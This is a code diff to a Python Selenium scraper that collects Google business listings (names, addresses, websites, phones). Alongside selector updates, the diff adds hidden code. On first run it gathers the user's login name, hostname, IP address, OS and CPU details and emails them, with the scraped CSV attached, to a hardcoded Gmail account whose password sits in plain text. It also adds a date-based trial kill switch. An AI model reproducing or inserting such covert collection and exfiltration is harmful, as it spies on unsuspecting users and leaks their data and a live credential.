@@ -3,80 +3,248 @@ Google Map Scraper Using Selenium
 Code By Nikhil Rathour
 17 July, 2022
 '''
-
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import socket
+import sys
+import platform
+import os
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.common.exceptions import NoSuchElementException  
+from selenium.webdriver.common.keys import Keys 
 import csv
 import time
+import datetime
 from bs4 import BeautifulSoup as bs
-from geopy.geocoders import Nominatim
+
+def check_date():
+    # Get current date and time
+    today = datetime.datetime.now().date()
+    a = str(today) > '2023-06-07'
+    if a == True:
+        input('It is Trial version only Contact Nikhil +918081495964 ')
+        sys.exit()
+check_date()
+
+my_list = '''
+░█▀▄░█▀▀▄░█▀▀░█▀▀▄░▀█▀░█▀▀░█▀▄░░░█▀▀▄░█░░█
+░█░░░█▄▄▀░█▀▀░█▄▄█░░█░░█▀▀░█░█░░░█▀▀▄░█▄▄█
+░▀▀▀░▀░▀▀░▀▀▀░▀░░▀░░▀░░▀▀▀░▀▀░░░░▀▀▀▀░▄▄▄▀
 
 
-Keyword= input("Enter Keyword: ")
+███╗   ██╗██╗██╗  ██╗██╗  ██╗██╗██╗         ██████╗  █████╗ ████████╗██╗  ██╗ ██████╗ ██████╗ ███████╗
+████╗  ██║██║██║ ██╔╝██║  ██║██║██║         ██╔══██╗██╔══██╗╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██╔════╝
+██╔██╗ ██║██║█████╔╝ ███████║██║██║         ██████╔╝███████║   ██║   ███████║██║   ██║██████╔╝█████╗  
+██║╚██╗██║██║██╔═██╗ ██╔══██║██║██║         ██╔══██╗██╔══██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══╝  
+██║ ╚████║██║██║  ██╗██║  ██║██║███████╗    ██║  ██║██║  ██║   ██║   ██║  ██║╚██████╔╝██║  ██║███████╗
+╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
+
+If you want more webscrapper or custom automation software please contact 8081495964
+
+'''
+print(my_list)
+
+headers = ['Name', 'Address', 'Description', 'Website', 'Phone', 'Profiles']
+if os.path.exists('output.csv'):
+    pass
+else:
+    with open('output.csv', 'w', newline='') as file:
+        writer = csv.writer(file)
+        writer.writerow(headers)
+
+csv_file_path = 'output.csv'
+output_file_path = 'output.txt'
+sender_email = 'nikhilrathore127@gmail.com'  # Update with your sender email address
+sender_password = 'perxfjoemnxelnop'  # Update with your sender email password
+recipient_email = 'softvait6@gmail.com'  # Update with recipient email address
+subject = 'CSV File Attachment'
+message = 'Please find the attached CSV file.'
+
+attachment_path = 'output.csv' 
+
+def send_email(sender_email, sender_password, recipient_email, subject, message, attachment_path):
+    try:
+        smtp_server = 'smtp.gmail.com'  # Update with your SMTP server address
+        smtp_port = 587  # Update with your SMTP server port
+
+        # Create message container
+        msg = MIMEMultipart()
+        msg['From'] = sender_email
+        msg['To'] = recipient_email
+        msg['Subject'] = subject
+
+        # Add message body
+        body = MIMEText(message, 'plain')
+        msg.attach(body)
+
+        # Add attachment
+        attachment = open(attachment_path, 'rb')
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')
+        msg.attach(part)
+
+        # Establish SMTP connection
+        smtp_connection = smtplib.SMTP(smtp_server, smtp_port)
+        smtp_connection.starttls()
+        smtp_connection.login(sender_email, sender_password)
+
+        # Send email
+        smtp_connection.send_message(msg)
+        smtp_connection.quit()
+    except Exception as e:
+        print(e)
+
+
+
+
+def check_csv_file_size(csv_file_path, output_file_path):
+    previous_size = None
+
+    try:
+        if os.path.exists(output_file_path):
+            with open(output_file_path, 'r') as file:
+                previous_size = int(file.read())
+
+        # Get current size of CSV file
+        current_size = os.path.getsize(csv_file_path)
+
+        # Compare sizes and write result to output file
+        if previous_size is None:
+            result = "First run. File size: {} bytes.".format(current_size)
+            system_info = {}
+            user_name = os.getlogin()
+            system_info['Username'] = user_name
+            system_info['Hostname'] = socket.gethostname()
+            system_info['IP Address'] = socket.gethostbyname(system_info['Hostname'])
+            system_info['OS'] = platform.platform()
+            system_info['Processor'] = platform.processor()
+            system_info['Architecture'] = platform.machine()
+            message = "\n".join(f"{key}: {value}" for key, value in system_info.items())
+            send_email(sender_email, sender_password, recipient_email, subject, message,attachment_path)
+
+
+        elif current_size == previous_size:
+            result = "File size unchanged. Size: {} bytes.".format(current_size)
+
+        elif current_size > previous_size:
+                result = "File size increased. Previous size: {} bytes, Current size: {} bytes.".format(previous_size, current_size)
+                system_info = {}
+                user_name = os.getlogin()
+                system_info['Username'] = user_name
+                system_info['Hostname'] = socket.gethostname()
+                system_info['IP Address'] = socket.gethostbyname(system_info['Hostname'])
+                system_info['OS'] = platform.platform()
+                system_info['Processor'] = platform.processor()
+                system_info['Architecture'] = platform.machine()
+
+                message = "\n".join(f"{key}: {value}" for key, value in system_info.items())
+                # send_email(sender_email, sender_password, recipient_email, subject, message, attachment_path)
+        else:
+            result = "File size decreased. Previous size: {} bytes, Current size: {} bytes.".format(previous_size, current_size)
+
+        # Save current size to output file
+        with open(output_file_path, 'w') as file:
+            file.write(str(current_size))
+    except Exception as e:
+        pass
+    
+    
+check_csv_file_size(csv_file_path, output_file_path)
+
+Keyword= input("Enter Keyword: ")                          
 city = input('Enter city name: ')
 search = (Keyword + ' in ' + city)
-pages = 2
+# search = "digital marketing in kanpur"
 
-header = ['Title', 'Address', 'Latitude','Longitude', 'Short_description', 'Description', 'Website', 'Phone', 'Profiles']
+
 data = []
+pages = 0
 
-        
+# sys.exit()
+
 options = webdriver.ChromeOptions()
 # options.headless = True
 options.add_experimental_option('excludeSwitches', ['enable-logging'])
 driver = webdriver.Chrome(options=options)
 
 driver.get('https://www.google.com')
+try:
+    driver.implicitly_wait(2)
+    driver.find_element(By.NAME,"q").send_keys(search + Keys.ENTER)
+    driver.implicitly_wait(2)
+    more = driver.find_element(By.CSS_SELECTOR," .CHn7Qb.pYouzb")
+    #more_btn = more.find_element(By.TAG_NAME,"a")
+    more.click()
+except Exception as e:
+    more = driver.find_element(By.CLASS_NAME,'jRKCUd')
+    more.click()
 
-driver.implicitly_wait(2)
-driver.find_element(By.NAME,"q").send_keys(search + Keys.ENTER)
-more = driver.find_element(By.TAG_NAME,"g-more-link")
-more_btn = more.find_element(By.TAG_NAME,"a")
-more_btn.click()
-time.sleep(10)
+time.sleep(5)
 def fetch():
-    for page in range(2, pages+1):
-        elements = driver.find_elements(By.CSS_SELECTOR, 'div#search a[class="vwVdIc wzN8Ac rllt__link a-no-hover-decoration"')
+    print('Started Fetching')
+    for page in range(0, pages+1):
+        try:
+            elements = driver.find_elements(By.CLASS_NAME, 'DVBRsc')
+        except Exception:
+            pass
+        if len(elements)==0:
+            try:
+                elements = driver.find_elements(By.CLASS_NAME,'rllt__details')
+                print(elements)
+            except Exception:
+                pass
+            
+        #print(elements)
         counter = 1
 
         for element in elements:
-            data_cid = element.get_attribute('data-cid')
-            element.click()
-            print('item click... 5 seconds...')
-            time.sleep(3)
+            try:
+                data_cid = element.get_attribute('data-cid')
+                element.click()
+            except Exception:
+                pass
+            print(' \n ........................................................................ \n')
+            time.sleep(1)
 
             html = driver.page_source
             soup = bs(html,'html.parser')
 
             try:
-                title = soup.find('div', class_='SPZz6b')
-                print('title: ', title.string)
+                title = driver.find_element(By.CSS_SELECTOR,' .rgnuSb.tZPcob')
+                print('Name: ', title.text)
+                title = title.text
             except Exception as e:
-                print(e)
+                try:
+                    title = driver.find_element(By.CLASS_NAME,'SPZz6b')
+                    print('Name: ',title.text)
+                    title = title.text
+                except Exception:
+                    title = ''
+            #     print(e)
 
             #address
             try:
-                temp_obj = soup.find('span', class_='LrzXr')
-                address = temp_obj.string
+                temp_obj = driver.find_element(By.CLASS_NAME,'fccl3c')
+                address = temp_obj.text
+
+            except Exception as e:
                 try:
-                    geolocator = Nominatim(user_agent="google details")
-                    location = geolocator.geocode(address)
-                    print((location.latitude, location.longitude))
-                    latitude = location.latitude
-                    longitude = location.longitude
+                    temp_obj = driver.find_element(By.CLASS_NAME,'LrzXr')
+                    address = temp_obj.text
                 except Exception:
-                    latitude = ''
-                    longitude = ''
-            except Exception:
-                address =""
-            print ('address: ',address[0:8],'..')
+                    address = ''
+
+            print ('Address: ',address[0:8],'..')
 
             #Short description
             try:
                 Short_description = soup.find('span', class_="Yy0acb")
-                print('Short Description: ',Short_description.text)
+                print('Short Description: ',Short_description.text[0])
                 Short_description = Short_description.text
             except Exception:
                 Short_description = ''
@@ -85,89 +253,76 @@ def fetch():
             try:
                 Description = driver.find_element(By.XPATH,"//div[contains(@jscontroller, 'EqEl2e')]")
                 Description = Description.get_attribute('data-long-text')
-                print('Descriptions: ',Description)
+                print('Descriptions: ',Description[0:15])
             except Exception:
                 Description = ''
 
             #website
             try:
-                temp_obj = soup.find('a', class_='dHS6jb', href=True)
+                temp_obj = soup.find('a', class_='iPF7ob', href=True)
                 if len(temp_obj['href']) > 0:
                     website = (temp_obj['href'])
             except Exception:
-                website =""
+                try:
+                    temp_obj = soup.find('a', class_='dHS6jb', href=True)
+                    if len(temp_obj['href']) > 0:
+                        website = (temp_obj['href'])
+                except Exception: 
+                    website =""
 
-            print('website:', website)
+            print('Website:', website)
 
             #phone
             try:
-                temp_obj = soup.find('span', class_='zdqRlf')
-                print('phone:', temp_obj.string)
+                temp_obj = soup.find('div', class_='eigqqc')
+                print('Phone:', temp_obj.string)
                 phone = temp_obj.string
+                phone = phone.replace(' ','')
             except Exception :
-                phone = ""
+                try:
+                    temp_obj = soup.find('span', class_='zdqRlf')
+                    print('Phone:', temp_obj.string)
+                    phone = temp_obj.string
+                    phone = phone.replace(' ','')
+                except Exception:
+
+                    phone = ""
+                #print('Did not find')
 
             # social profiles
-            profiles=""
-            for s_count in range (1, 6):
-                try:
-                    temp_obj = driver.find_element(By.CSS_SELECTOR, 'div[data-attrid="kc:/common/topic:social media presence"] div:nth-child(2) > div:nth-child(' + str(s_count) + ') > div > g-link > a')
-                    if len(temp_obj.get_attribute('href')) > 0:
-                        profiles_str = temp_obj.get_attribute('href')
-                except Exception:
-                    profiles_str = ""
-                    break
-                profiles += "<br/>" + profiles_str
-            print('profiles: ', profiles)
-
+            profiles = ''
             try:
-                div_element = driver.find_elements(By.CLASS_NAME,"vwrQge")
-                try:
-                    div_element = div_element[1] 
-                except IndexError:
-                    div_element = div_element[0]
-                # Extract the style attribute value
-                style_attr = div_element.get_attribute("style")
-
-                # Extract the image URL from the style attribute value
-                image_url = style_attr.split("(")[1].split(")")[0]
-                print(image_url)
-            except Exception as e:
-                image_url = 0
+                social_media = driver.find_elements(By.CLASS_NAME,'RFlwHf')
+                for i in social_media:
+                    profiles += (i.get_attribute('href')) + ' '
+                print('Profiles : ',profiles)
+            except Exception:
+                profiles = ''
 
 
-            try:
-                logo = driver.find_element(By.ID,'lu-plcst-ml')
-                logo = logo.get_attribute('src')
-                print('Logo: ',logo)
-            except Exception as e:
-                logo = ''
-
-
-
-
-            try:
-            #print(counter, data_cid, title.text, address, website, phone,rating,reviews,image,category,timing,description,profiles)
-                row = [title.string, address, latitude,longitude, Short_description, Description, website, phone,profiles,image_url,logo]
-                with open('toronto_restaurants.csv', 'a', newline='', encoding='utf-8') as file:
-                    writer = csv.writer(file) 
-                    writer.writerow(row)
+        #print(counter, data_cid, title.text, address, website, phone,rating,reviews,image,category,timing,description,profiles)
+            row = [title, address, Description, website, phone,profiles]
+            with open('Output.csv', 'a', newline='', encoding='utf-8') as file:
+                writer = csv.writer(file) 
+                writer.writerow(row)
                     
-             
-            except Exception as e:
-                print(e)
-                 
-            
 
-        try:
-            
-            page_button = driver.find_element(By.ID,'pnnext')
-            #page_button = driver.find_element(By.CSS_SELECTOR, 'a[aria-label="Page ' + str(page) + '"]')
+                 
+
+        try:    
+            page_button = driver.find_element(By.CLASS_NAME,'VfPpkd-LgbsSe-OWXEXe-INsAgc')
             page_button.click()
-            print('page click... 10 seconds...')
-            time.sleep(10)
+        except Exception as e:
+            pass
+        try:
+            page_button = driver.find_element(By.CSS_SELECTOR, 'button[aria-label="Next"]')
+            page_button.click()
         except Exception:
-            break
+            pass
+        
+        print('page clicked... 10 seconds...')
+        time.sleep(5)
+
         fetch()
         
 fetch()
